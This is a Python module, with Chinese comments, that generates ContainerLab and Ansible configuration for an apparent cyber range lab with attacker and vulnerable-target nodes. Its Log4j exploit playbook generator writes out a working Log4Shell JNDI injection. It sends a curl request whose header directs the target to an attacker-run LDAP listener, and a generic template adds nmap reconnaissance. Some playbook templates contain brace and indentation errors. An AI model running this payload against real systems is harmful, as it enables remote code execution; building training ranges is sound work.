"""拓扑生成器 - 将输入YAML转换为ContainerLab和Ansible配置

支持两种输入格式：
1. ContainerLab标准YAML格式（推荐）
2. 自定义IaC格式（向后兼容）

处理流程：
1. 自动检测输入格式
2. 解析拓扑规格
3. 生成ContainerLab YAML用于基础设施层
4. 生成Ansible配置用于业务逻辑层（路由、DNS、防火墙等）
"""
import yaml
import random
from typing import Dict, Any, List, Tuple, Optional
from ..models.models import TopologySpecification, NetworkNode


class TopologyGenerator:
    """拓扑生成器 - 主要入口点"""

    def __init__(self, topology_yaml: str):
        """
        初始化拓扑生成器

        Args:
            topology_yaml: 拓扑YAML字符串或文件路径
        """
        self.yaml_file = topology_yaml  # 保存文件路径用于格式检测
        self.topology_data = self._load_yaml(topology_yaml)
        self.specification: TopologySpecification = None

    def _load_yaml(self, yaml_input: str) -> Dict[str, Any]:
        """加载YAML数据"""
        # 尝试作为文件路径加载
        try:
            with open(yaml_input, 'r', encoding='utf-8') as f:
                return yaml.safe_load(f)
        except (FileNotFoundError, IOError):
            # 作为字符串加载
            return yaml.safe_load(yaml_input)

    def generate(self) -> Tuple[str, Dict[str, Any]]:
        """
        生成完整的部署配置

        Returns:
            Tuple[str, Dict[str, Any]]: (ContainerLab YAML, Ansible配置字典)
        """
        # 自动检测输入格式并解析拓扑规格
        self.specification = self._parse_input_format()

        # 生成ContainerLab配置
        clab_config = self._generate_containerlab_config()

        # 生成Ansible配置
        ansible_config = self._generate_ansible_config()

        return clab_config, ansible_config

    def _parse_input_format(self) -> TopologySpecification:
        """自动检测输入格式并解析拓扑规格"""
        if self._is_containerlab_format():
            print("🔍 检测到ContainerLab标准格式")
            from .parser import ContainerLabParser
            parser = ContainerLabParser(str(self.yaml_file) if hasattr(self, 'yaml_file') else str(self.topology_data))
            return parser.extract_topology_specification()
        else:
            print("🔍 检测到自定义IaC格式")
            from .parsers import IaCParser
            parser = IaCParser()
            return parser.parse_topology(self.topology_data)

    def _is_containerlab_format(self) -> bool:
        """检测是否为ContainerLab标准格式"""
        # ContainerLab标准格式特征：
        # 1. 顶层有'name'字段
        # 2. 有'topology.nodes'或'topology.links'字段
        # 3. 节点配置中有'kind'字段

        if 'topology' not in self.topology_data:
            return False

        topology = self.topology_data.get('topology', {})

        # 检查是否有ContainerLab特征字段
        if 'nodes' in topology or 'links' in topology:
            # 进一步检查节点配置
            nodes = topology.get('nodes', {})
            if nodes and isinstance(nodes, dict):
                # 检查第一个节点是否有'kind'字段
                first_node = next(iter(nodes.values()))
                if 'kind' in first_node or 'image' in first_node:
                    return True

        return False

    def _generate_containerlab_config(self) -> str:
        """生成ContainerLab YAML配置"""
        # 生成节点配置（包括bridge节点）
        nodes = self._generate_nodes()

        # 生成链路配置
        links = self._generate_links()

        # 构建ContainerLab配置（完全符合DNS要求：只包含字母数字和连字符）
        lab_name = self.specification.lab_name.replace('-', '').replace('_', '').replace('.', '').lower()
        clab_config = {
            'name': lab_name,
            'topology': {
                'nodes': nodes,
                'links': links
            }
        }

        return yaml.dump(clab_config, default_flow_style=False, sort_keys=False)

    def _generate_nodes(self) -> Dict[str, Dict[str, Any]]:
        """生成ContainerLab节点配置"""
        nodes = {}

        for node in self.specification.nodes:
            node_config = {}

            # 使用vars中的kind，或者根据类型推断
            if node.vars and 'kind' in node.vars:
                node_config['kind'] = node.vars['kind']
            else:
                node_config['kind'] = 'linux'

            # 设置镜像
            if node.image:
                node_config['image'] = node.image

            # 添加端口配置（只处理真正的端口配置）
            if node.ports and isinstance(node.ports, list):
                node_config['ports'] = node.ports

            # 如果是路由器，添加特殊配置
            if node.type == 'router':
                node_config['sysctls'] = {'net.ipv4.ip_forward': '1'}

            # 添加labels中的额外配置（过滤掉ContainerLab不支持的字段）
            if node.vars:
                # ContainerLab支持的labels字段
                supported_fields = ['group', 'role', 'network_layer', 'routing_protocol',
                                 'service_type', 'domain_name', 'startup_priority']
                labels = {k: v for k, v in node.vars.items() if k in supported_fields}
                if labels:
                    node_config['labels'] = labels

            nodes[node.name] = node_config

        return nodes

    def _generate_links(self) -> List[Dict[str, List[str]]]:
        """生成ContainerLab链路配置 - 只使用原始links定义"""
        links = []

        for link in self.specification.links:
            links.append({
                'endpoints': [
                    f"{link.source}:{link.source_interface}",
                    f"{link.destination}:{link.destination_interface}"
                ]
            })

        return links

    def _generate_ansible_config(self) -> Dict[str, Any]:
        """生成Ansible配置字典"""
        ansible_config = {
            'inventory': self._generate_ansible_inventory(),
            'group_vars': self._generate_group_vars(),
            'playbooks': self._generate_playbooks()
        }

        return ansible_config

    def _generate_ansible_inventory(self) -> Dict[str, Any]:
        """生成Ansible inventory配置"""
        inventory = {
            'all': {
                'vars': {
                    'ansible_python_interpreter': '/usr/bin/python3',
                    'lab_name': self.specification.lab_name
                }
            },
            'routers': {'hosts': []},
            'attackers': {'hosts': []},
            'vuln_targets': {'hosts': []},
            'decoys': {'hosts': []},
            'dns_servers': {'hosts': []},
            'dhcp_servers': {'hosts': []}
        }

        # 按节点类型分组
        for node in self.specification.nodes:
            if node.type == 'router':
                inventory['routers']['hosts'].append(node.name)
            elif node.type == 'attacker':
                inventory['attackers']['hosts'].append(node.name)
            elif node.type == 'vuln-target':
                inventory['vuln_targets']['hosts'].append(node.name)
            elif node.type == 'decoy':
                inventory['decoys']['hosts'].append(node.name)
            elif node.type == 'dns':
                inventory['dns_servers']['hosts'].append(node.name)
            elif node.type == 'dhcp':
                inventory['dhcp_servers']['hosts'].append(node.name)

        return inventory

    def _generate_group_vars(self) -> Dict[str, Any]:
        """生成Ansible group_vars配置"""
        topology_zones = self.topology_data.get('topology', {})

        # 生成网络配置
        networks = {}
        for zone_name, zone_config in topology_zones.items():
            if not isinstance(zone_config, dict):
                continue

            subnet = zone_config.get('subnet', '')
            gateway = zone_config.get('gateway', '')

            if subnet:
                # 提取网络地址用于配置
                networks[zone_name] = {
                    'network_addr': subnet,
                    'gateway_addr': gateway,
                    'subnet': subnet
                }

        return {
            'all': {
                'networks': networks,
                'lab_name': self.specification.lab_name
            }
        }

    def _generate_playbooks(self) -> Dict[str, str]:
        """生成Ansible playbooks"""
        playbooks = {}

        # 生成主要部署playbook
        playbooks['deploy'] = self._generate_deploy_playbook()

        # 生成路由配置playbook
        playbooks['configure_routing'] = self._generate_routing_playbook()

        # 生成DNS配置playbook
        playbooks['configure_dns'] = self._generate_dns_playbook()

        # 生成网络隔离playbook
        if self.specification.isolation_policies:
            playbooks['configure_network_isolation'] = self._generate_network_isolation_playbook()

        # 生成CVE攻击playbooks - 新增
        cve_playbooks = self._generate_cve_exploit_playbooks()
        if cve_playbooks:
            playbooks['cve_exploits'] = cve_playbooks

        return playbooks

    def _generate_deploy_playbook(self) -> str:
        """生成部署playbook"""
        playbook = f"""
---
- name: Deploy {self.specification.lab_name}
  hosts: localhost
  gather_facts: false
  tasks:
    - name: Deploy ContainerLab topology
      ansible.builtin.command:
        cmd: clab deploy -t {{ topology_file }}
      register: deploy_result

    - name: Wait for containers to be ready
      ansible.builtin.pause:
        seconds: 30

- name: Configure network infrastructure
  hosts: routers
      become: true
  tasks:
    - name: Enable IP forwarding
      ansible.builtin.sysctl:
        name: net.ipv4.ip_forward
        value: '1'
        sysctl_set: true
        state: present
        reload: true

    - name: Configure routing
      ansible.builtin.include_role:
        name: routing

- name: Configure DNS servers
  hosts: dns_servers
  become: true
  tasks:
    - name: Configure DNS service
      ansible.builtin.include_role:
        name: dns
"""
        return playbook

    def _generate_routing_playbook(self) -> str:
        """生成路由配置playbook"""
        return """
---
- name: Configure routing
  hosts: routers
  become: true
  tasks:
    - name: Flush NAT table
      ansible.builtin.iptables:
        table: nat
        flush: true

    - name: Enable IP forwarding
      ansible.builtin.sysctl:
        name: net.ipv4.ip_forward
        value: '1'
        sysctl_set: true

    - name: Configure MASQUERADE
      ansible.builtin.iptables:
        table: nat
        chain: POSTROUTING
        jump: MASQUERADE
        when: "'edge' in inventory_hostname or 'external' in group_names"

    - name: Configure static routes
      ansible.builtin.command:
        cmd: "ip route add {{ item.network }} via {{ item.gateway }}"
      loop: "{{ routing_routes }}"
      when: routing_routes is defined
      ignore_errors: true
"""

    def _generate_dns_playbook(self) -> str:
        """生成DNS配置playbook"""
        return """
---
- name: Configure DNS
  hosts: dns_servers
  become: true
  tasks:
    - name: Install DNS server
      ansible.builtin.apt:
        name:
          - bind9
          - dnsutils
        state: present

    - name: Configure DNS zones
      ansible.builtin.template:
        src: dns_zone.conf.j2
        dest: "/etc/bind/zones/{{ item.domain }}.db"
        owner: bind
        group: bind
        mode: '0644'
      loop: "{{ dns_zones }}"
      when: dns_zones is defined
      notify: restart dns

    - name: Configure DNS main config
      ansible.builtin.template:
        src: named.conf.j2
        dest: /etc/bind/named.conf
        owner: bind
        group: bind
        mode: '0644'
      notify: restart dns

  handlers:
    - name: restart dns
      ansible.builtin.service:
        name: bind9
        state: restarted
"""

    def _generate_network_isolation_playbook(self) -> str:
        """生成网络隔离playbook"""
        # 生成隔离规则任务
        isolation_tasks = []

        # 添加基础规则
        isolation_tasks.extend([
            {
                'name': 'Flush existing FORWARD rules',
                'iptables':
                    {
                        'table': 'filter',
                        'chain': 'FORWARD',
                        'flush': 'yes'
                    }
            },
            {
                'name': 'Set default FORWARD policy to DROP',
                'iptables':
                    {
                        'table': 'filter',
                        'chain': 'FORWARD',
                        'policy': 'DROP'
                    }
            },
            {
                'name': 'Allow established and related connections',
                'iptables':
                    {
                        'table': 'filter',
                        'chain': 'FORWARD',
                        'state': 'present',
                        'protocol': 'all',
                        'ctstate': ['ESTABLISHED', 'RELATED'],
                        'jump': 'ACCEPT'
                    }
            }
        ])

        # 为每个隔离策略生成规则
        for policy in self.specification.isolation_policies:
            source_subnet = self._get_zone_subnet(policy.source)
            dest_subnet = self._get_zone_subnet(policy.destination)

            if policy.action == 'ACCEPT':
                # 生成ACCEPT规则
                if policy.allowed_protocols:
                    for protocol in policy.allowed_protocols:
                        if policy.allowed_ports:
                            # 特定端口规则
                            for port in policy.allowed_ports:
                                task = {
                                    'name': f"Allow {policy.source} -> {policy.destination} {protocol.upper()} port {port}",
                                    'iptables': {
                                        'table': 'filter',
                                        'chain': 'FORWARD',
                                        'source': source_subnet,
                                        'destination': dest_subnet,
                                        'protocol': protocol,
                                        'destination_port': port,
                                        'jump': 'ACCEPT'
                                    }
                                }
                                isolation_tasks.append(task)
                        else:
                            # 协议级别的允许规则
                            task = {
                                'name': f"Allow {policy.source} -> {policy.destination} {protocol.upper()}",
                                'iptables': {
                                    'table': 'filter',
                                    'chain': 'FORWARD',
                                    'source': source_subnet,
                                    'destination': dest_subnet,
                                    'protocol': protocol,
                                    'jump': 'ACCEPT'
                                }
                            }
                            isolation_tasks.append(task)
                else:
                    # 无协议限制的允许规则
                    task = {
                        'name': f"Allow {policy.source} -> {policy.destination}",
                        'iptables': {
                            'table': 'filter',
                            'chain': 'FORWARD',
                            'source': source_subnet,
                            'destination': dest_subnet,
                            'jump': 'ACCEPT'
                        }
                    }
                    isolation_tasks.append(task)
            else:
                # 生成DROP/REJECT规则
                if policy.log:
                    # 添加日志规则
                    log_task = {
                        'name': f"Log {policy.source} -> {policy.destination} blocked traffic",
                        'iptables': {
                            'table': 'filter',
                            'chain': 'FORWARD',
                            'source': source_subnet,
                            'destination': dest_subnet,
                            'jump': 'LOG',
                            'log_prefix': f"ISOLATION_{policy.source.upper()}_{policy.destination.upper()}: "
                        }
                    }
                    isolation_tasks.append(log_task)

                # 添加阻止规则
                block_task = {
                    'name': f"Block {policy.source} -> {policy.destination} ({policy.action})",
                    'iptables': {
                        'table': 'filter',
                        'chain': 'FORWARD',
                        'source': source_subnet,
                        'destination': dest_subnet,
                        'jump': policy.action
                    }
                }
                isolation_tasks.append(block_task)

        # 构建完整的playbook
        playbook = {
            'name': 'Configure Network Isolation',
            'hosts': 'routers',
            'become': True,
            'tasks': isolation_tasks
        }

        return yaml.dump(playbook, default_flow_style=False)

    def _get_zone_subnet(self, zone_name: str) -> str:
        """获取安全区域的子网"""
        if zone_name in self.specification.security_zones:
            return self.specification.security_zones[zone_name].subnet
        else:
            # 如果区域不存在，返回默认子网
            return f"10.105.0.0/24"

    def _generate_cve_exploit_playbooks(self) -> Dict[str, str]:
        """生成CVE攻击playbooks"""
        exploit_playbooks = {}
        cve_nodes = [node for node in self.specification.nodes if node.cve_injection]
        if not cve_nodes:
            return exploit_playbooks

        print(f"   🎯 为{len(cve_nodes)}个CVE节点生成攻击playbook")

        for cve_node in cve_nodes:
            cve_id = cve_node.cve_injection.get('cve_id', 'unknown')
            playbook_name = f"exploit_{cve_id.replace('-', '_')}_{cve_node.name}"
            playbook_content = self._generate_single_cve_playbook(cve_node, cve_id)
            exploit_playbooks[playbook_name] = playbook_content

        return exploit_playbooks

    def _generate_single_cve_playbook(self, node: NetworkNode, cve_id: str) -> str:
        """为单个CVE生成攻击playbook"""
        target_name = node.name
        target_ports = node.ports if node.ports else [80, 443]
        target_ip = self._get_expected_node_ip(node)

        if 'CVE-2021-44228' in cve_id:
            return self._generate_log4j_exploit_playbook(target_name, target_ip, target_ports)
        else:
            return self._generate_generic_exploit_playbook(target_name, cve_id, target_ip, target_ports)

    def _get_expected_node_ip(self, node: NetworkNode) -> str:
        """获取节点的预期IP地址"""
        if 'attacker' in node.role.lower():
            return "10.100.0.2"
        elif 'database' in node.role.lower():
            return "10.102.0.3"
        else:
            return "192.168.1.100"

    def _generate_log4j_exploit_playbook(self, target_name: str, target_ip: str, target_ports: List[int]) -> str:
        """生成Log4j exploit playbook"""
        port = target_ports[0] if target_ports else 8080

        # 使用format()避免f-string转义问题
        playbook_template = """---
- name: Log4j CVE-2021-44228 Exploit Playbook
  hosts: attackers
  become: false
  vars:
    target_host: {target_name}
    target_ip: {target_ip}
    target_port: {port}

  tasks:
    - name: 1. 环境准备
      ansible.builtin.shell: |
        docker run -d --name ldap-listener -p 1389:1389 --restart always rpatecki/ldap-server:latest
      async: 45
      poll: 0

    - name: 2. 执行Log4j注入攻击
      ansible.builtin.shell: |
        PAYLOAD="${{jndi:ldap://10.100.0.2:1389/Exploit}}"
        curl -s -X POST -H 'User-Agent: ${{PAYLOAD}}' http://{target_ip}:{port}/login
      register: exploit_result
      failed_when: false

    - name: 3. 生成攻击报告
      ansible.builtin.copy:
        content: "Log4j exploit完成 - 目标: {{{{ target_host }}}} - CVE: CVE-2021-44228"
        dest: "/tmp/exploit_report_{target_name}_log4j.txt"
"""
        return playbook_template.format(
            target_name=target_name,
            target_ip=target_ip,
            port=port
        )

    def _generate_generic_exploit_playbook(self, target_name: str, cve_id: str, target_ip: str, target_ports: List[int]) -> str:
        """生成通用exploit playbook模板"""

        # 使用format()避免f-string转义问题
        playbook_template = """---
- name: {cve_id} Exploit Playbook
  hosts: attackers
  become: false
  vars:
    target_host: {target_name}
    target_ip: {target_ip}
    cve_id: {cve_id}

  tasks:
    - name: 1. 侦察阶段
      ansible.builtin.shell: "nmap -sV -p 80,443 {target_ip}"
      register: recon
      failed_when: false

    - name: 2. 漏洞验证
      debug:
        msg: "针对{{{cve_id}}}}的具体exploit步骤需要进一步实现"

    - name: 3. 生成报告
      ansible.builtin.copy:
        content: "{cve_id}}} exploit模板 - 目标: {{{{ target_host }}}}"
        dest: "/tmp/exploit_report_{target_name}_generic.txt"
"""
        return playbook_template.format(
            cve_id=cve_id,
            target_name=target_name,
            target_ip=target_ip
        )


class NetworkConfigGenerator:
    """网络配置生成器 - 生成路由、DNS、防火墙配置"""

    def __init__(self, specification: TopologySpecification):
        self.specification = specification

    def generate_routing_config(self, node: NetworkNode) -> Dict[str, Any]:
        """为节点生成路由配置"""
        if node.type != 'router' or not node.routing:
            return {}

        routing_config = {
            'protocol': node.routing.get('protocol', 'static'),
            'interfaces': [],
            'routes': []
        }

        # 处理接口配置
        if node.interfaces:
            for interface in node.interfaces:
                routing_config['interfaces'].append({
                    'name': interface['name'],
                    'network': interface['network'],
                    'ip': interface['ip']
                })

        # 生成静态路由
        if node.routing.get('protocol') == 'ospf':
            routing_config['ospf_config'] = self._generate_ospf_config(node)
        else:
            routing_config['static_routes'] = self._generate_static_routes(node)

        return routing_config

    def _generate_ospf_config(self, node: NetworkNode) -> Dict[str, Any]:
        """生成OSPF配置"""
        return {
            'router_id': self._extract_router_id(node),
            'networks': self._extract_ospf_networks(node),
            'areas': ['0.0.0.0']  # 默认区域0
        }

    def _generate_static_routes(self, node: NetworkNode) -> List[Dict[str, str]]:
        """生成静态路由"""
        routes = []
        topology_zones = self.specification._topology_data.get('topology', {})

        # 为每个不直接连接的网络生成路由
        if node.interfaces:
            connected_networks = [iface['network'] for iface in node.interfaces]

            for zone_name, zone_config in topology_zones.items():
                if zone_name not in connected_networks:
                    gateway = self._find_next_hop(node, zone_name)
                    if gateway:
                        routes.append({
                            'network': zone_config['subnet'],
                            'gateway': gateway,
                            'interface': self._find_interface_for_network(node, zone_name)
                        })

        return routes

    def _extract_router_id(self, node: NetworkNode) -> str:
        """从IP地址提取路由器ID"""
        if node.ip_address:
            return node.ip_address.split('.')[-1]
        return '1'

    def _extract_ospf_networks(self, node: NetworkNode) -> List[str]:
        """提取OSPF网络"""
        networks = []
        if node.interfaces:
            for interface in node.interfaces:
                if 'ip' in interface:
                    networks.append(interface['ip'])
        return networks

    def _find_next_hop(self, node: NetworkNode, target_network: str) -> str:
        """查找到目标网络的下一跳"""
        # 简化实现 - 实际需要更复杂的路由计算
        for other_node in self.specification.nodes:
            if other_node.type == 'router' and other_node.name != node.name:
                if target_network in other_node.networks:
                    return other_node.ip_address
        return None

    def _find_interface_for_network(self, node: NetworkNode, network: str) -> str:
        """查找连接到指定网络的接口"""
        if node.interfaces:
            for interface in node.interfaces:
                if interface.get('network') == network:
                    return interface['name']
        return 'eth0'

    def generate_dns_config(self) -> Dict[str, Any]:
        """生成DNS配置"""
        dns_config = {
            'zones': [],
            'records': []
        }

        # 从拓扑数据中提取DNS配置
        if self.specification.dns:
            for dns_entry in self.specification.dns:
                zone_config = {
                    'domain': dns_entry.get('domain'),
                    'internal_target': dns_entry.get('internal', {}).get('machine'),
                    'external_target': dns_entry.get('external', {}).get('machine'),
                    'network': dns_entry.get('internal', {}).get('network')
                }
                dns_config['zones'].append(zone_config)

        return dns_config

    def generate_firewall_config(self, node: NetworkNode) -> List[str]:
        """生成防火墙规则"""
        if node.type not in ['router', 'firewall']:
            return []

        rules = [
            "# Flush existing rules",
            "iptables -F",
            "iptables -t nat -F",

            "# Default policies",
            "iptables -P FORWARD DROP",
            "iptables -P INPUT DROP",
            "iptables -P OUTPUT ACCEPT",

            "# Allow loopback",
            "iptables -A INPUT -i lo -j ACCEPT",
            "iptables -A OUTPUT -o lo -j ACCEPT",

            "# Allow established connections",
            "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
            "iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT"
        ]

        # 如果是边缘路由器，添加NAT规则
        if 'edge' in node.name.lower():
            rules.extend([
                "",
                "# Edge router NAT rules",
                "iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE",
                "iptables -A FORWARD -i eth1 -o eth2 -m state --state RELATED,ESTABLISHED -j ACCEPT",
                "iptables -A FORWARD -i eth2 -o eth1 -j ACCEPT"
            ])

        # 添加端口转发规则
        if self.specification.port_forwarding:
            for pf_rule in self.specification.port_forwarding:
                rules.append(
                    f"# Port forward {pf_rule['destination_port']} -> {pf_rule['to_machine']}:{pf_rule['to_port']}"
                )
                rules.append(
                    f"iptables -t nat -A PREROUTING -p tcp --dport {pf_rule['destination_port']} -j DNAT --to-destination {pf_rule['to_machine']}:{pf_rule['to_port']}"
                )

        return rules


def main():
    """主函数 - 测试拓扑生成器"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python topology_generator.py <topology_yaml>")
        sys.exit(1)

    topology_file = sys.argv[1]

    generator = TopologyGenerator(topology_file)
    clab_config, ansible_config = generator.generate()

    # 输出ContainerLab配置
    print("=" * 50)
    print("ContainerLab Configuration:")
    print("=" * 50)
    print(clab_config)

    # 输出Ansible配置
    print("\n" + "=" * 50)
    print("Ansible Configuration:")
    print("=" * 50)
    print(yaml.dump(ansible_config, default_flow_style=False))


if __name__ == "__main__":
    main()
